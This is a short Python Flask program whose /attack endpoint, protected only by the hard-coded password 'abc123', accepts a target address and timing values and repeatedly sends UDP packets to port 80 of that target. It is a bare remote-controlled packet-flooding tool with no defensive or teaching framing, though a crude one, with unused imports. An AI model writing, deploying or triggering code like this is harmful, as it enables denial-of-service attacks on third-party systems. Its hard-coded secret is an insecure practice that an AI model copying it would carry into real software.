import datetime
import random
import socket
import time

from collections import defaultdict

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return 'OK'

@app.route('/attack', methods=['POST'])
def attack():
    if request.form['secret'] != 'abc123':
        return 'Nope'

    target = request.form['target']
    num_attacks = int(request.form['num_attacks'])
    duration = int(request.form['duration'])
    interval = int(request.form['interval'])

    def _send_attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b'cybersecurity attack!', (target, 80))

    for i in range(num_attacks):
        _send_attack()
        time.sleep(interval)

    time.sleep(duration)

    return 'OK'